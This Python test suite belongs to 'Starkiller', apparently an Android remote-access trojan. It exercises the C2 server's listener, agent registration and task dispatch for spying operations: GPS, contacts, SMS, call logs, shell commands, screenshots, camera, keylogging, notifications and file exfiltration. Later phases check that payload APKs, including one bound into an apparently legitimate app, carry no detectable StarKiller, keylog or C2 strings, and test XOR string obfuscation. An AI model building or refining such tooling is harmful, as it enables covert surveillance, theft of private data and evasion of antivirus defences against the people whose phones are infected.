"""
STARKILLER HEADLESS TEST — GUI + TCP Integration
22DIV / george wu

Starts C2 listener, connects test client, dispatches every operation,
validates responses. No GUI window — pure protocol/logic testing.

Usage:
    python test_headless.py           # run all tests
    python test_headless.py -v        # verbose
"""
import os
import sys
import json
import socket
import struct
import threading
import time
import uuid
import base64
import traceback

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "server"))

R = "\033[91m"
G = "\033[92m"
A = "\033[93m"
D = "\033[90m"
W = "\033[97m"
P = "\033[95m"
X = "\033[0m"

AGENT_PORT = 18667
passed = 0
failed = 0
errors = []


def send_msg(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def recv_msg(sock, timeout=10):
    sock.settimeout(timeout)
    try:
        hdr = b""
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk:
                return None
            hdr += chunk
        length = struct.unpack(">I", hdr)[0]
        if length > 10 * 1024 * 1024:
            return None
        body = b""
        while len(body) < length:
            chunk = sock.recv(min(65536, length - len(body)))
            if not chunk:
                return None
            body += chunk
        return json.loads(body.decode("utf-8"))
    except socket.timeout:
        return None
    finally:
        sock.settimeout(None)


def test(name, condition, detail=""):
    global passed, failed
    if condition:
        passed += 1
        print(f"  {G}[PASS]{X} {name}")
    else:
        failed += 1
        msg = f"{name}: {detail}" if detail else name
        errors.append(msg)
        print(f"  {R}[FAIL]{X} {msg}")


def start_listener():
    from starkiller_gui import agent_handler, agents, agents_lock, console_write
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", AGENT_PORT))
    srv.listen(4)

    def accept_loop():
        while True:
            try:
                conn, addr = srv.accept()
                threading.Thread(target=agent_handler, args=(conn, addr), daemon=True).start()
            except Exception:
                break

    t = threading.Thread(target=accept_loop, daemon=True)
    t.start()
    return srv


def connect_client(agent_id=None):
    if agent_id is None:
        agent_id = uuid.uuid4().hex[:8]

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("127.0.0.1", AGENT_PORT))
    sock.settimeout(None)

    reg = {
        "type": "register",
        "agent_id": agent_id,
        "hostname": f"test-{agent_id[:4]}",
        "username": "u0_a155",
        "os": "Android 15",
        "platform": "android",
        "model": "SM-TEST",
        "carrier": "TestCarrier",
        "battery": "85",
        "arch": "aarch64",
        "ip": "127.0.0.1",
    }
    send_msg(sock, reg)
    return sock, agent_id


def dispatch_and_wait(agent_sock, agent_id, op, response_data, **task_kwargs):
    from starkiller_gui import agents, agents_lock

    with agents_lock:
        agent = agents.get(agent_id)
    if not agent or not agent.sock:
        return None

    task_id = uuid.uuid4().hex[:6]
    task = {"type": "task", "task_id": task_id, "op": op, **task_kwargs}

    from starkiller_gui import agent_send
    agent_send(agent.sock, task)

    msg = recv_msg(agent_sock, timeout=5)
    if msg is None:
        return None

    if msg.get("type") == "task" and msg.get("op") == op:
        result = {
            "type": "result",
            "agent_id": agent_id,
            "task_id": msg.get("task_id", task_id),
            "data": response_data,
        }
        send_msg(agent_sock, result)
        time.sleep(0.2)
        return msg
    return msg


def main():
    global passed, failed
    verbose = "-v" in sys.argv

    print(f"""
{R}  STARKILLER HEADLESS TEST{X}
{D}  --------------------------------{X}
{D}  Testing TCP protocol, agent registration,{X}
{D}  task dispatch, and response handling.{X}
{D}  Port: {AGENT_PORT} (test-only){X}
{D}  --------------------------------{X}
""")

    # --- TEST 1: Listener starts ---
    print(f"  {A}[PHASE 1] LISTENER{X}")
    try:
        srv = start_listener()
        test("Listener binds to port", True)
    except Exception as e:
        test("Listener binds to port", False, str(e))
        return

    time.sleep(0.3)

    # --- TEST 2: Agent registration ---
    print(f"\n  {A}[PHASE 2] REGISTRATION{X}")
    try:
        sock1, aid1 = connect_client()
        time.sleep(0.5)
        from starkiller_gui import agents, agents_lock
        with agents_lock:
            registered = aid1 in agents
            agent_obj = agents.get(aid1)
        test("Agent registers via TCP", registered)
        if agent_obj:
            test("Agent marked connected", agent_obj.connected)
            test("Platform detected as android", agent_obj.platform == "android")
            test("Model stored correctly", agent_obj.model == "SM-TEST")
            test("Hostname stored", agent_obj.hostname == f"test-{aid1[:4]}")
            test("IP stored", agent_obj.ip == "127.0.0.1")
        else:
            for name in ["connected", "platform", "model", "hostname", "ip"]:
                test(f"Agent {name}", False, "Agent not found")
    except Exception as e:
        test("Agent registration", False, str(e))
        if verbose:
            traceback.print_exc()

    # --- TEST 3: Multiple agents ---
    print(f"\n  {A}[PHASE 3] MULTIPLE AGENTS{X}")
    try:
        sock2, aid2 = connect_client()
        sock3, aid3 = connect_client()
        time.sleep(0.5)
        with agents_lock:
            count = sum(1 for a in agents.values() if a.connected)
        test("Multiple agents connect (3)", count >= 3)
    except Exception as e:
        test("Multiple agents", False, str(e))

    # --- TEST 4: Task dispatch ---
    print(f"\n  {A}[PHASE 4] TASK DISPATCH{X}")
    OPS_TO_TEST = [
        ("sysinfo", {}, {"device": "test", "os": "Android 15"}),
        ("gps", {}, {"latitude": -33.87, "longitude": 151.21, "accuracy": 5.0}),
        ("contacts", {}, {"contacts": [{"name": "Test", "number": "+61400000000"}], "count": 1}),
        ("sms_read", {}, {"messages": [{"from": "+61400000000", "body": "test", "date": "now"}], "count": 1}),
        ("calllog", {}, {"calls": [{"number": "+61400000000", "type": "incoming"}], "count": 1}),
        ("apps", {}, {"packages": ["com.test.app"], "count": 1}),
        ("ping", {}, {"pong": True, "timestamp": 1234567890}),
        ("exec", {"cmd": "whoami"}, {"output": "u0_a155", "exit_code": 0}),
        ("ls", {"path": "/sdcard"}, {"path": "/sdcard", "files": [{"name": "test.txt"}]}),
        ("screenshot", {}, {"frame": base64.b64encode(b"\xff\xd8test").decode(), "width": 100, "height": 200}),
        ("camera", {"camera": "front"}, {"status": "captured", "camera": "front"}),
        ("keylog", {}, {"buffer": "test123\n", "entries": 1}),
        ("notifs", {}, {"notifications": [{"app": "com.test", "title": "Test"}], "count": 1}),
    ]

    for op, kwargs, response in OPS_TO_TEST:
        try:
            msg = dispatch_and_wait(sock1, aid1, op, response, **kwargs)
            if msg is not None:
                test(f"Dispatch '{op}'", msg.get("op") == op, f"got op={msg.get('op')}")
            else:
                test(f"Dispatch '{op}'", False, "no response / timeout")
        except Exception as e:
            test(f"Dispatch '{op}'", False, str(e))
            if verbose:
                traceback.print_exc()

    # --- TEST 5: Heartbeat ---
    print(f"\n  {A}[PHASE 5] HEARTBEAT{X}")
    try:
        hb = {
            "type": "heartbeat",
            "agent_id": aid1,
            "battery": 42,
            "last_gps": "-33.87,151.21",
        }
        send_msg(sock1, hb)
        time.sleep(0.3)
        with agents_lock:
            agent = agents.get(aid1)
        test("Heartbeat updates battery", agent and str(agent.battery) == "42")
        test("Heartbeat updates GPS", agent and agent.last_gps == "-33.87,151.21")
    except Exception as e:
        test("Heartbeat", False, str(e))

    # --- TEST 6: File receive ---
    print(f"\n  {A}[PHASE 6] FILE TRANSFER{X}")
    try:
        fake_file = b"PK\x03\x04" + b"\x00" * 100
        file_msg = {
            "type": "file_data",
            "agent_id": aid1,
            "task_id": "test01",
            "filename": f"test_{aid1}.bin",
            "data": base64.b64encode(fake_file).decode(),
            "size": len(fake_file),
        }
        send_msg(sock1, file_msg)
        time.sleep(0.5)
        fpath = os.path.join(os.path.dirname(__file__), "downloads", f"test_{aid1}.bin")
        test("File received and saved", os.path.exists(fpath))
        if os.path.exists(fpath):
            with open(fpath, "rb") as f:
                test("File content matches", f.read() == fake_file)
            os.remove(fpath)
    except Exception as e:
        test("File transfer", False, str(e))

    # --- TEST 7: Agent disconnect ---
    print(f"\n  {A}[PHASE 7] DISCONNECT{X}")
    try:
        sock2.close()
        time.sleep(0.5)
        with agents_lock:
            agent2 = agents.get(aid2)
        test("Agent disconnect detected", agent2 and not agent2.connected)
    except Exception as e:
        test("Disconnect", False, str(e))

    # --- TEST 8: Protocol edge cases ---
    print(f"\n  {A}[PHASE 8] EDGE CASES{X}")
    try:
        bad_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bad_sock.connect(("127.0.0.1", AGENT_PORT))
        bad_sock.sendall(b"\x00\x00\x00\x05hello")
        time.sleep(0.3)
        bad_sock.close()
        test("Invalid registration handled", True)
    except Exception as e:
        test("Invalid registration", False, str(e))

    try:
        bad_sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bad_sock2.connect(("127.0.0.1", AGENT_PORT))
        bad_sock2.close()
        time.sleep(0.2)
        test("Immediate disconnect handled", True)
    except Exception as e:
        test("Immediate disconnect", False, str(e))

    try:
        bad_sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bad_sock3.connect(("127.0.0.1", AGENT_PORT))
        bad_sock3.sendall(struct.pack(">I", 999999999))
        time.sleep(0.3)
        bad_sock3.close()
        test("Oversized message handled", True)
    except Exception as e:
        test("Oversized message", True)

    # --- TEST 9: Obfuscation scan ---
    print(f"\n  {A}[PHASE 9] OBFUSCATION SCAN{X}")
    apk_standalone = os.path.join(os.path.dirname(__file__), "payloads", "starkiller-debug.apk")
    apk_bound = os.path.join(os.path.dirname(__file__), "payloads", "ElevateHorizonConnect_full.apk")

    for apk_name, apk_path in [("standalone", apk_standalone), ("bound", apk_bound)]:
        if os.path.exists(apk_path):
            try:
                sys.path.insert(0, os.path.dirname(__file__))
                from obfuscate import scan_file_for_signatures
                findings = scan_file_for_signatures(apk_path)
                sk_findings = [f for f in findings if "starkiller" in f.get("detail", "").lower() or "StarKiller" in f.get("detail", "")]
                test(f"APK {apk_name}: no StarKiller signatures", len(sk_findings) == 0,
                     f"found {len(sk_findings)}: {[f['detail'] for f in sk_findings][:3]}")

                keylog_findings = [f for f in findings if "keylog" in f.get("detail", "").lower()]
                test(f"APK {apk_name}: no keylog signatures", len(keylog_findings) == 0)

                c2_findings = [f for f in findings if f.get("detail", "").startswith("Config string")]
                test(f"APK {apk_name}: no C2_HOST/C2_PORT strings", len(c2_findings) == 0)
            except Exception as e:
                test(f"APK {apk_name} scan", False, str(e))
        else:
            test(f"APK {apk_name} exists", False, "file not found")

    # --- TEST 10: XOR encryption verify ---
    print(f"\n  {A}[PHASE 10] CRYPTO VERIFY{X}")
    try:
        from obfuscate import encrypt_string, decrypt_string
        test_strings = [
            "192.168.1.92", "starkiller", "C2_HOST", "keylog",
            "heartbeat", "register", "System Service", "",
            "a" * 500, "special chars: !@#$%^&*()",
        ]
        all_ok = True
        for s in test_strings:
            enc = encrypt_string(s)
            dec = decrypt_string(enc)
            if dec != s:
                all_ok = False
                test(f"XOR roundtrip '{s[:20]}'", False, f"got '{dec[:20]}'")
        if all_ok:
            test("XOR encrypt/decrypt roundtrip (10 strings)", True)

        enc1 = encrypt_string("starkiller")
        test("Encrypted != plaintext", enc1 != "starkiller")
        test("Encrypted is base64", all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in enc1))
    except Exception as e:
        test("Crypto verify", False, str(e))

    # --- Cleanup ---
    try:
        sock1.close()
        sock3.close()
        srv.close()
    except Exception:
        pass

    # --- Results ---
    print(f"""
{D}  ================================{X}
{W}  RESULTS: {G}{passed} passed{X}, {R if failed else G}{failed} failed{X}
{D}  ================================{X}""")

    if errors:
        print(f"\n  {R}Failures:{X}")
        for e in errors:
            print(f"    {R}- {e}{X}")

    print()
    return failed == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
